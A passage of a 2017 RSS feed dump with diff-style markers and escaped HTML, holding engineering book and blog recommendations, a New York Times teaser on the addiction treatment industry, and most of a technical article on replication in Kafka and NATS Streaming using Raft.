-&lt;ul&gt;&lt;li&gt;Peopleware Productive projects and Teams. Amazon. My Summary.&lt;/li&gt;
-&lt;li&gt;Team Geek: A Software Developer’s Guide to Working Well with Others. (Debugging Teams) Amazon. My Summary.&lt;/li&gt;
-&lt;li&gt;High Output Management&lt;/li&gt;
-&lt;li&gt;Getting Things Done: The Art of Stress-Free Productivity&lt;/li&gt;
-&lt;li&gt;The 4-Hour Workweek: Escape 9-5, Live Anywhere, and Join the New Rich&lt;/li&gt;
-&lt;li&gt;The 7 Habits of Highly Effective People: Powerful Lessons in Personal Change&lt;/li&gt;
-&lt;li&gt;Conscious Business: How to Build Value Through Values&lt;/li&gt;
-&lt;li&gt;Your Brain at Work&lt;/li&gt;
-&lt;li&gt;Flow: The Psychology of Optimal Experience&lt;/li&gt;
-&lt;li&gt;Succeed: How We Can Reach Our Goals&lt;/li&gt;
-&lt;/ul&gt;&lt;h3&gt;Blogs:&lt;/h3&gt;
-&lt;p&gt;“Recommended Blogs To Follow&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;http://www.theeffectiveengineer.com/&quot; rel=&quot;nofollow&quot;&gt;http://www.theeffectiveengineer.com/&lt;/a&gt;. The Effective Engineer is my personal blog, where I write about engineering habits, productivity tips, leadership, and culture. &lt;a href=&quot;http://www.kalzumeus.com/&quot; rel=&quot;nofollow&quot;&gt;http://www.kalzumeus.com/&lt;/a&gt;. Patrick McKenzie runs his own software business and has written many excellent long-form articles on career advice, consulting, SEO, and software sales. &lt;a href=&quot;http://katemats.com/&quot; rel=&quot;nofollow&quot;&gt;http://katemats.com/&lt;/a&gt;. Kate Matsudaira, who has worked at large companies like Microsoft and Amazon as well as at startups, shares advice about tech, leadership, and life on her blog.” “&lt;a href=&quot;http://randsinrepose.com/&quot; rel=&quot;nofollow&quot;&gt;http://randsinrepose.com/&lt;/a&gt;. Michael Lopp has worked for many years in leadership positions at Netscape, Apple, Palantir, and Pinterest, and writes about tech life and engineering management. &lt;a href=&quot;http://softwareleadweekly.com/&quot; rel=&quot;nofollow&quot;&gt;http://softwareleadweekly.com/&lt;/a&gt;. Oren Ellenbogen curates a high-quality weekly newsletter on engineering leadership and culture. &lt;a href=&quot;http://calnewport.com/&quot; rel=&quot;nofollow&quot;&gt;http://calnewport.com/&lt;/a&gt;. Cal Newport, an assistant professor of computer science at Georgetown, focuses on evidence-based advice for building a successful and fulfilling life. &lt;a href=&quot;http://www.joelonsoftware.com/&quot; rel=&quot;nofollow&quot;&gt;http://www.joelonsoftware.com/&lt;/a&gt;. Joel Spolsky, the co-founder of Stack Exchange, provides all sorts of programming pearls of wisdom on his blog. &lt;a href=&quot;http://martinfowler.com/&quot; rel=&quot;nofollow&quot;&gt;http://martinfowler.com/&lt;/a&gt;. Martin Fowler, author of the book Refactoring, writes about how to maximize the productivity of software teams and provides detailed write-ups of common programming patterns. &lt;a href=&quot;http://pgbovine.net/&quot; rel=&quot;nofollow&quot;&gt;http://pgbovine.net/&lt;/a&gt;. Philip Guo, a computer science professor, has written extensively and openly about his graduate school and work experiences.”&lt;/p&gt;
-</description>
-<pubDate>Thu, 28 Dec 2017 16:21:44 +0000</pubDate>
-<dc:creator>signa11</dc:creator>
-<og:image>https://avatars3.githubusercontent.com/u/6609?s=400&amp;v=4</og:image>
-<og:type>object</og:type>
-<og:title>Effective_Engineer.md</og:title>
-<og:url>https://gist.github.com/rondy/af1dee1d28c02e9a225ae55da2674a6f</og:url>
-<dc:language>en</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>https://gist.github.com/rondy/af1dee1d28c02e9a225ae55da2674a6f</dc:identifier>
-</item>
-<item>
-<title>The lucrative business of America’s opioid crisis</title>
-<link>https://www.nytimes.com/interactive/2017/12/27/business/addiction-inc.html</link>
-<guid isPermaLink="true" >https://www.nytimes.com/interactive/2017/12/27/business/addiction-inc.html</guid>
-<description>&lt;p class=&quot;paragraph&quot;&gt;&lt;strong&gt;America’s Addiction Crisis&lt;/strong&gt; ranks among the great epidemics of our age. Millions of people have fallen victim to painkiller abuse, alcoholism, the rise of meth and the revival of heroin. Sorrowful tales of death at a young age and of families torn apart have become a defining feature of the early 21st century American experience.&lt;/p&gt;
-&lt;p class=&quot;paragraph&quot;&gt;In crisis, there is opportunity — and entrepreneurs have swept in.&lt;/p&gt;
-&lt;p class=&quot;paragraph&quot;&gt;The industry of addiction treatment is haphazardly regulated, poorly understood and expanding at a rapid clip, bringing in $35 billion a year. Remarkably, this business is often conducted behind the closed doors of suburban homes scattered across the nation.&lt;/p&gt;
-&lt;p class=&quot;paragraph&quot;&gt;With this report, we open those doors.&lt;/p&gt;
-&lt;p class=&quot;paragraph&quot;&gt;Drug treatment is a trade dominated by former addicts, who have transformed their personal experience of getting clean into the business of helping others. It is a field that mints millionaires whose companies drug-test urine. It has spawned experts in the art of online marketing, who pursue addicts and the revenue they (and their insurers) represent.&lt;/p&gt;
-&lt;p class=&quot;paragraph&quot;&gt;Here are their stories.&lt;/p&gt;
-</description>
-<pubDate>Thu, 28 Dec 2017 14:47:04 +0000</pubDate>
-<dc:creator>dpflan</dc:creator>
-<og:url>https://www.nytimes.com/interactive/2017/12/27/business/addiction-inc.html</og:url>
-<og:type>article</og:type>
-<og:title>Addiction Inc.</og:title>
-<og:image>https://static01.nyt.com/images/2017/12/18/business/addiction/addiction-facebookJumbo-v3.jpg</og:image>
-<og:description>Marketing wizards and urine-testing millionaires: Inside the lucrative business of America’s opioid crisis.</og:description>
-<dc:language>en</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>https://www.nytimes.com/interactive/2017/12/27/business/addiction-inc.html</dc:identifier>
-</item>
-<item>
-<title>Building a Distributed Log from Scratch: Data Replication</title>
-<link>https://bravenewgeek.com/building-a-distributed-log-from-scratch-part-2-data-replication/</link>
-<guid isPermaLink="true" >https://bravenewgeek.com/building-a-distributed-log-from-scratch-part-2-data-replication/</guid>
-<description>&lt;p&gt;In &lt;a href=&quot;https://bravenewgeek.com/building-a-distributed-log-from-scratch-part-1-storage-mechanics/&quot;&gt;part one&lt;/a&gt; of this series we introduced the idea of a message log, touched on why it’s useful, and discussed the storage mechanics behind it. In part two, we discuss data replication.&lt;/p&gt;
-&lt;p&gt;We have our log. We know how to write data to it and read it back as well as how data is persisted. The caveat to this is, although we have a durable log, it’s a single point of failure (SPOF). If the machine where the log data is stored dies, we’re SOL. Recall that one of our three priorities with this system is high availability, so the question is how do we achieve high availability and fault tolerance?&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/spof.png&quot;&gt;&lt;img class=&quot;size-full wp-image-3110 aligncenter&quot; src=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/spof.png&quot; alt=&quot;&quot; width=&quot;1591&quot; height=&quot;860&quot; srcset=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/spof.png 1591w, https://bravenewgeek.com/wp-content/uploads/2017/12/spof-300x162.png 300w, https://bravenewgeek.com/wp-content/uploads/2017/12/spof-768x415.png 768w, https://bravenewgeek.com/wp-content/uploads/2017/12/spof-1024x554.png 1024w&quot; sizes=&quot;(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;With high availability, we’re specifically talking about ensuring continuity of reads and writes. A server failing shouldn’t preclude either of these, or at least unavailability should be kept to an absolute minimum and without the need for operator intervention. Ensuring this continuity should be fairly obvious: we eliminate the SPOF. To do that, we replicate the data. Replication can also be a means for increasing scalability, but for now we’re only looking at this through the lens of high availability.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/replicated_log.png&quot;&gt;&lt;img class=&quot;size-full wp-image-3112 aligncenter&quot; src=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/replicated_log.png&quot; alt=&quot;&quot; width=&quot;1591&quot; height=&quot;860&quot; srcset=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/replicated_log.png 1591w, https://bravenewgeek.com/wp-content/uploads/2017/12/replicated_log-300x162.png 300w, https://bravenewgeek.com/wp-content/uploads/2017/12/replicated_log-768x415.png 768w, https://bravenewgeek.com/wp-content/uploads/2017/12/replicated_log-1024x554.png 1024w&quot; sizes=&quot;(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;There are a number of ways we can go about replicating the log data. Broadly speaking, we can group the techniques into two different categories: gossip/multicast protocols and consensus protocols. The former includes things like epidemic broadcast trees, bimodal multicast, SWIM, HyParView, and NeEM. These tend to be eventually consistent and/or stochastic. The latter, which I’ve described in more detail &lt;a href=&quot;https://bravenewgeek.com/understanding-consensus/&quot;&gt;here&lt;/a&gt;, includes 2PC/3PC, Paxos, Raft, Zab, and chain replication. These tend to favor strong consistency over availability.&lt;/p&gt;
-&lt;p&gt;So there are a lot of ways we can replicate data, but some of these solutions are better suited than others to this particular problem. Since ordering is an important property of a log, consistency becomes important for a &lt;em&gt;replicated&lt;/em&gt; log. If we read from one replica and then read from another, it’s important those views of the log don’t conflict with each other. This more or less rules out the stochastic and eventually consistent options, leaving us with consensus-based replication.&lt;/p&gt;
-&lt;p&gt;There are essentially two components to consensus-based replication schemes: 1) designate a leader who is responsible for sequencing writes and 2) replicate the writes to the rest of the cluster.&lt;/p&gt;
-&lt;p&gt;Designating a leader can be as simple as a configuration setting, but the purpose of replication is fault tolerance. If our configured leader crashes, we’re no longer able to accept writes. This means we need the leader to be dynamic. It turns out leader election is a well-understood problem, so we’ll get to this in a bit.&lt;/p&gt;
-&lt;p&gt;Once a leader is established, it needs to replicate the data to followers. In general, this can be done by either waiting for all replicas or waiting for only a quorum (majority) of replicas. There are pros and cons to both approaches.&lt;/p&gt;
-&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td/&gt;
-&lt;td&gt;&lt;strong&gt;Pros&lt;/strong&gt;&lt;/td&gt;
-&lt;td&gt;&lt;strong&gt;Cons&lt;/strong&gt;&lt;/td&gt;
-&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;All Replicas&lt;/strong&gt;&lt;/td&gt;
-&lt;td&gt;Tolerates &lt;em&gt;f&lt;/em&gt; failures with &lt;em&gt;f+1&lt;/em&gt; replicas&lt;/td&gt;
-&lt;td&gt;Latency pegged to slowest replica&lt;/td&gt;
-&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Quorum&lt;/strong&gt;&lt;/td&gt;
-&lt;td&gt;Hides delay from a slow replica&lt;/td&gt;
-&lt;td&gt;Tolerates &lt;em&gt;f&lt;/em&gt; failures with &lt;em&gt;2f+1&lt;/em&gt; replicas&lt;/td&gt;
-&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;Waiting on all replicas means we can make progress as long as at least one replica is available. With quorum, tolerating the same amount of failures requires more replicas because we need a majority to make progress. The trade-off is that the quorum hides any delays from a slow replica. Kafka is an example of a system which uses all replicas (with some conditions on this which we will see later), and NATS Streaming is one that uses a quorum. Let’s take a look at both in more detail.&lt;/p&gt;
-&lt;h3&gt;Replication in Kafka&lt;/h3&gt;
-&lt;p&gt;In Kafka, a leader is selected (we’ll touch on this in a moment). This leader maintains an in-sync replica set (ISR) consisting of all the replicas which are fully caught up with the leader. This is every replica, by definition, at the beginning. All reads and writes go through the leader. The leader writes messages to a write-ahead log (WAL). Messages written to the WAL are considered uncommitted or “dirty” initially. The leader only commits a message once all replicas in the ISR have written it to their own WAL. The leader also maintains a high-water mark (HW) which is the last committed message in the WAL. This gets piggybacked on the replica fetch responses from which replicas periodically checkpoint to disk for recovery purposes. The piggybacked HW then allows replicas to know when to commit.&lt;/p&gt;
-&lt;p&gt;Only committed messages are exposed to consumers. However, producers can configure how they want to receive acknowledgements on writes. It can wait until the message is committed on the leader (and thus replicated to the ISR), wait for the message to only be written (but not committed) to the leader’s WAL, or not wait at all. This all depends on what trade-offs the producer wants to make between latency and durability.&lt;/p&gt;
-&lt;p&gt;The graphic below shows how this replication process works for a cluster of three brokers: &lt;em&gt;b1&lt;/em&gt;, &lt;em&gt;b2&lt;/em&gt;, and &lt;em&gt;b3&lt;/em&gt;. Followers are effectively special consumers of the leader’s log.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_replication.png&quot;&gt;&lt;img class=&quot;size-full wp-image-3141 aligncenter&quot; src=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_replication.png&quot; alt=&quot;&quot; width=&quot;1430&quot; height=&quot;889&quot; srcset=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_replication.png 1430w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_replication-300x187.png 300w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_replication-768x477.png 768w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_replication-1024x637.png 1024w&quot; sizes=&quot;(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Now let’s look at a few failure modes and how Kafka handles them.&lt;/p&gt;
-&lt;h4&gt;Leader Fails&lt;/h4&gt;
-&lt;p&gt;Kafka relies on &lt;a href=&quot;https://zookeeper.apache.org/&quot;&gt;Apache ZooKeeper&lt;/a&gt; for certain cluster coordination tasks, such as leader election, though this is not actually how the log leader is elected. A Kafka cluster has a single controller broker whose election is handled by ZooKeeper. This controller is responsible for performing administrative tasks on the cluster. One of these tasks is selecting a new log leader (actually &lt;em&gt;partition&lt;/em&gt; leader, but this will be described later in the series) from the ISR when the current leader dies. ZooKeeper is also used to detect these broker failures and signal them to the controller.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_leader_failure.png&quot;&gt;&lt;img class=&quot;size-full wp-image-3147 aligncenter&quot; src=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_leader_failure.png&quot; alt=&quot;&quot; width=&quot;1663&quot; height=&quot;947&quot; srcset=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_leader_failure.png 1663w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_leader_failure-300x171.png 300w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_leader_failure-768x437.png 768w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_leader_failure-1024x583.png 1024w&quot; sizes=&quot;(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Thus, when the leader crashes, the cluster controller is notified by ZooKeeper and it selects a new leader from the ISR and announces this to the followers. This gives us automatic failover of the leader. All committed messages up to the HW are preserved and uncommitted messages may be lost during the failover. In this case, &lt;em&gt;b1&lt;/em&gt; fails and &lt;em&gt;b2&lt;/em&gt; steps up as leader.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_leader_failover.png&quot;&gt;&lt;img class=&quot;size-full wp-image-3145 aligncenter&quot; src=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_leader_failover.png&quot; alt=&quot;&quot; width=&quot;1663&quot; height=&quot;743&quot; srcset=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_leader_failover.png 1663w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_leader_failover-300x134.png 300w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_leader_failover-768x343.png 768w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_leader_failover-1024x458.png 1024w&quot; sizes=&quot;(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h4&gt;Follower Fails&lt;/h4&gt;
-&lt;p&gt;The leader tracks information on how “caught up” each replica is. Before Kafka 0.9, this included both how many messages a replica was behind, &lt;em&gt;replica.lag.max.messages&lt;/em&gt;, and the amount of time since the replica last fetched messages from the leader, &lt;em&gt;replica.lag.time.max.ms&lt;/em&gt;. Since 0.9, &lt;em&gt;replica.lag.max.messages&lt;/em&gt; was removed and &lt;em&gt;replica.lag.time.max.ms&lt;/em&gt; now refers to both the time since the last fetch request &lt;em&gt;and &lt;/em&gt;the amount of time since the replica last caught up.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_failure.png&quot;&gt;&lt;img class=&quot;size-full wp-image-3149 aligncenter&quot; src=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_failure.png&quot; alt=&quot;&quot; width=&quot;1430&quot; height=&quot;889&quot; srcset=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_failure.png 1430w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_failure-300x187.png 300w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_failure-768x477.png 768w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_failure-1024x637.png 1024w&quot; sizes=&quot;(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Thus, when a follower fails (or stops fetching messages for whatever reason), the leader will detect this based on &lt;em&gt;replica.lag.time.max.ms&lt;/em&gt;. After that time expires, the leader will consider the replica out of sync and remove it from the ISR. In this scenario, the cluster enters an “under-replicated” state since the ISR has shrunk. Specifically, &lt;em&gt;b2&lt;/em&gt; fails and is removed from the ISR.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_failure_removed.png&quot;&gt;&lt;img class=&quot;size-full wp-image-3150 aligncenter&quot; src=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_failure_removed.png&quot; alt=&quot;&quot; width=&quot;1430&quot; height=&quot;687&quot; srcset=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_failure_removed.png 1430w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_failure_removed-300x144.png 300w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_failure_removed-768x369.png 768w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_failure_removed-1024x492.png 1024w&quot; sizes=&quot;(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h4&gt;Follower Temporarily Partitioned&lt;/h4&gt;
-&lt;p&gt;The case of a follower being temporarily partitioned, e.g. due to a transient network failure, is handled in a similar fashion to the follower itself failing. These two failure modes can really be combined since the latter is just the former with an arbitrarily long partition, i.e. it’s the difference between crash-stop and crash-recovery models.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_partition.png&quot;&gt;&lt;img class=&quot;size-full wp-image-3152 aligncenter&quot; src=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_partition.png&quot; alt=&quot;&quot; width=&quot;1430&quot; height=&quot;889&quot; srcset=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_partition.png 1430w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_partition-300x187.png 300w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_partition-768x477.png 768w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_partition-1024x637.png 1024w&quot; sizes=&quot;(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;In this case, &lt;em&gt;b3&lt;/em&gt; is partitioned from the leader. As before, &lt;em&gt;replica.lag.time.max.ms &lt;/em&gt;acts as our failure detector and causes &lt;em&gt;b3&lt;/em&gt; to be removed from the ISR. We enter an under-replicated state and the remaining two brokers continue committing messages 4 and 5. Accordingly, the HW is updated to 5 on these brokers.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_partition_removed.png&quot;&gt;&lt;img class=&quot;size-full wp-image-3153 aligncenter&quot; src=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_partition_removed.png&quot; alt=&quot;&quot; width=&quot;1461&quot; height=&quot;889&quot; srcset=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_partition_removed.png 1461w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_partition_removed-300x183.png 300w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_partition_removed-768x467.png 768w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_partition_removed-1024x623.png 1024w&quot; sizes=&quot;(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;When the partition heals, &lt;em&gt;b3&lt;/em&gt; continues reading from the leader and catching up. Once it is fully caught up with the leader, it’s added back into the ISR and the cluster resumes its fully replicated state.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_partition_healed.png&quot;&gt;&lt;img class=&quot;size-full wp-image-3155 aligncenter&quot; src=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_partition_healed.png&quot; alt=&quot;&quot; width=&quot;1472&quot; height=&quot;889&quot; srcset=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_partition_healed.png 1472w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_partition_healed-300x181.png 300w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_partition_healed-768x464.png 768w, https://bravenewgeek.com/wp-content/uploads/2017/12/kafka_follower_partition_healed-1024x618.png 1024w&quot; sizes=&quot;(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;We can generalize this to the crash-recovery model. For example, instead of a network partition, the follower could crash and be restarted later. When the failed replica is restarted, it recovers the HW from disk and truncates its log up to the HW. This preserves the invariant that messages after the HW are not guaranteed to be committed. At this point, it can begin catching up from the leader and will end up with a log consistent with the leader’s once fully caught up.&lt;/p&gt;
-&lt;h3&gt;Replication in NATS Streaming&lt;/h3&gt;
-&lt;p&gt;NATS Streaming relies on the &lt;a href=&quot;https://raft.github.io/&quot;&gt;Raft consensus algorithm&lt;/a&gt; for leader election and data replication. This sometimes comes as a surprise to some as Raft is largely seen as a protocol for replicated state machines. We’ll try to understand why Raft was chosen for this particular problem in the following sections. We won’t dive deep into Raft itself beyond what is needed for the purposes of this discussion.&lt;/p&gt;
-&lt;p&gt;While a log is a state machine, it’s a very simple one: a series of appends. Raft is frequently used as the replication mechanism for key-value stores which have a clearer notion of “state machine.” For example, with a key-value store, we have &lt;em&gt;set&lt;/em&gt; and &lt;em&gt;delete&lt;/em&gt; operations. If we set &lt;em&gt;foo = bar&lt;/em&gt; and then later set &lt;em&gt;foo = baz&lt;/em&gt;, the state gets rolled up. That is, we don’t necessarily care about the provenance of the key, only its current state.&lt;/p&gt;
-&lt;p&gt;However, NATS Streaming differs from Kafka in a number of key ways. One of these differences is that NATS Streaming attempts to provide a sort of unified API for streaming and queueing semantics not too dissimilar from &lt;a href=&quot;https://pulsar.apache.org/&quot;&gt;Apache Pulsar&lt;/a&gt;. This means, while it has a notion of a log, it also has subscriptions on that log. Unlike Kafka, NATS Streaming tracks these subscriptions and metadata associated with them, such as where a client is in the log. These have definite “state machines” affiliated with them, like creating and deleting subscriptions, positions in the log, clients joining or leaving queue groups, and message-redelivery information.&lt;/p&gt;
-&lt;p&gt;Currently, NATS Streaming uses multiple Raft groups for replication. There is a single metadata Raft group used for replicating client state and there is a separate Raft group per topic which replicates messages and subscriptions.&lt;/p&gt;
-&lt;p&gt;Raft solves both the problems of leader election and data replication in a single protocol. The &lt;a href=&quot;http://thesecretlivesofdata.com/raft/&quot;&gt;Secret Lives of Data&lt;/a&gt; provides an excellent interactive illustration of how this works. As you step through that illustration, you’ll notice that the algorithm is actually quite similar to the Kafka replication protocol we walked through earlier. This is because although Raft is used to implement replicated state machines, it actually is a replicated WAL, which is exactly what Kafka is. One benefit of using Raft is we no longer have the need for ZooKeeper or some other coordination service.&lt;/p&gt;
-&lt;p&gt;Raft handles electing a leader. Heartbeats are used to maintain leadership. Writes flow through the leader to the followers. The leader appends writes to its WAL and they are subsequently piggybacked onto the heartbeats which get sent to the followers using &lt;em&gt;AppendEntries&lt;/em&gt; messages. At this point, the followers append the write to their own WALs, assuming they don’t detect a gap, and send a response back to the leader. The leader commits the write once it receives a successful response from a quorum of followers.&lt;/p&gt;
-&lt;p&gt;Similar to Kafka, each replica in Raft maintains a high-water mark of sorts called the &lt;em&gt;commit index&lt;/em&gt;, which is the index of the highest log entry known to be committed. This is piggybacked on the &lt;em&gt;AppendEntries &lt;/em&gt;messages which the followers use to know when to commit entries in their WALs. If a follower detects that it missed an entry (i.e. there was a gap in the log), it rejects the &lt;em&gt;AppendEntries&lt;/em&gt; and informs the leader to rewind the replication. The &lt;a href=&quot;https://raft.github.io/raft.pdf&quot;&gt;Raft paper&lt;/a&gt; details how it ensures correctness, even in the face of many failure modes such as the ones described earlier.&lt;/p&gt;
-&lt;p&gt;Conceptually, there are two logs: the Raft log and the NATS Streaming message log. The Raft log handles replicating messages and, once committed, they are appended to the NATS Streaming log. If it seems like there’s some redundancy here, that’s because there is, which we’ll get to soon. However, keep in mind we’re not just replicating the message log, but also the state machines associated with the log and any clients.&lt;/p&gt;
-&lt;p&gt;There are a few challenges with this replication technique, two of which we will talk about. The first is scaling Raft. With a single topic, there is one Raft group, which means one node is elected leader and it heartbeats messages to followers.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/raft_single_topic.png&quot;&gt;&lt;img class=&quot; wp-image-3165 aligncenter&quot; src=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/raft_single_topic.png&quot; alt=&quot;&quot; width=&quot;420&quot; height=&quot;270&quot; srcset=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/raft_single_topic.png 706w, https://bravenewgeek.com/wp-content/uploads/2017/12/raft_single_topic-300x193.png 300w&quot; sizes=&quot;(max-width: 420px) 100vw, 420px&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;As the number of topics increases, so do the number of Raft groups, each with their own leaders and heartbeats. Unless we constrain the Raft group participants or the number of topics, this creates an explosion of network traffic between nodes.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/raft_many_topics.png&quot;&gt;&lt;img class=&quot; wp-image-3166 aligncenter&quot; src=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/raft_many_topics.png&quot; alt=&quot;&quot; width=&quot;420&quot; height=&quot;301&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;There are a couple ways we can go about addressing this. One option is to run a fixed number of Raft groups and use a consistent hash to map a topic to a group. This can work well if we know roughly the number of topics beforehand since we can size the number of Raft groups accordingly. If you expect only 10 topics, running 10 Raft groups is probably reasonable. But if you expect 10,000 topics, you probably don’t want 10,000 Raft groups. If hashing is consistent, it would be feasible to dynamically add or remove Raft groups at runtime, but it would still require repartitioning a portion of topics which can be complicated.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/raft_fixed_groups.png&quot;&gt;&lt;img class=&quot; wp-image-3167 aligncenter&quot; src=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/raft_fixed_groups.png&quot; alt=&quot;&quot; width=&quot;420&quot; height=&quot;258&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Another option is to run an entire node’s worth of topics as a single group using a layer on top of Raft. This is what CockroachDB does to scale Raft in proportion to the number of key ranges using a layer on top of Raft they call &lt;a href=&quot;https://www.cockroachlabs.com/blog/scaling-raft/&quot;&gt;MultiRaft&lt;/a&gt;. This requires some cooperation from the Raft implementation, so it’s a bit more involved than the partitioning technique but eschews the repartitioning problem and redundant heartbeating.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/multiraft.png&quot;&gt;&lt;img class=&quot; wp-image-3168 aligncenter&quot; src=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/multiraft.png&quot; alt=&quot;&quot; width=&quot;420&quot; height=&quot;284&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;The second challenge with using Raft for this problem is the issue of “dual writes.” As mentioned before, there are really two logs: the Raft log and the NATS Streaming message log, which we’ll call the “store.” When a message is published, the leader writes it to its Raft log and it goes through the Raft replication process.&lt;/p&gt;
